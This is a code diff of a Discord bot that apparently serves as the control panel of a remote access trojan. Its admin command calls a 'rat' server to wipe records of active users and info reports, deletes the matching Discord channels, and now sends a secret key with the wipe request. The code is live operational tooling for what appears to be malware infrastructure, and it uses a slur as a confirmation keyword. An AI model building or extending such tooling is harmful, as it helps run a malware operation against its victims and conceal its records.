@@ -191,13 +191,14 @@ async def clear_active_command(interaction: discord.Interaction, confirm: str = 
     if not interaction.user.guild_permissions.administrator:
         await interaction.response.send_message("kid u got no perms", ephemeral=True)
         return
-    
+
     author_id = interaction.user.id
+    DEL_KEY = os.getenv("delkey")
 
     if confirm == "doitretard":
         await interaction.response.defer(ephemeral=True)
         try:
-            res = requests.post("https://rat-01d5.onrender.com/clear_active")
+            res = requests.post("https://rat-01d5.onrender.com/clear_active", json={"key": DEL_KEY})
             if res.status_code == 200:
                 guild = discord.utils.get(client.guilds, id=1392242413740883968)
                 if guild:
@@ -206,17 +207,17 @@ async def clear_active_command(interaction: discord.Interaction, confirm: str = 
                         for ch in category.channels:
                             await ch.delete()
                 client.active_users.clear()
-                await interaction.followup.send("Cleared active users, info reports, and deleted channels.", ephemeral=True)
+                await interaction.followup.send("cleared DB + channels", ephemeral=True)
             else:
-                await interaction.followup.send("Failed to clear server data.", ephemeral=True)
+                await interaction.followup.send("failed to clear DB", ephemeral=True)
         except Exception as e:
-            await interaction.followup.send(f"Error: {e}", ephemeral=True)
+            await interaction.followup.send(f"error {e}", ephemeral=True)
         return
 
     if author_id not in client.clear_confirmations:
         client.clear_confirmations.add(author_id)
         await interaction.response.send_message(
-            "run the cmd again within 30 seconds to confirm"
+            "run the cmd again within 30 seconds to confirm\n"
             "or use `/clear_active doitretard` to force clear",
             ephemeral=True
         )
@@ -227,7 +228,7 @@ async def clear_active_command(interaction: discord.Interaction, confirm: str = 
     else:
         await interaction.response.defer(ephemeral=True)
         try:
-            res = requests.post("https://rat-01d5.onrender.com/clear_active")
+            res = requests.post("https://rat-01d5.onrender.com/clear_active", json={"key": DEL_KEY})
             if res.status_code == 200:
                 guild = discord.utils.get(client.guilds, id=1392242413740883968)
                 if guild:
@@ -236,11 +237,13 @@ async def clear_active_command(interaction: discord.Interaction, confirm: str = 
                         for ch in category.channels:
                             await ch.delete()
                 client.active_users.clear()
-                await interaction.followup.send("cleared db and deleted channels.", ephemeral=True)
+                await interaction.followup.send("cleared DB + channels", ephemeral=True)
             else:
-                await interaction.followup.send("failed to clear db", ephemeral=True)
+                await interaction.followup.send("failed to clear DB", ephemeral=True)
         except Exception as e:
             await interaction.followup.send(f"error {e}", ephemeral=True)
         client.clear_confirmations.discard(author_id)
+
+
 
 client.run(os.getenv("TOKEN"))
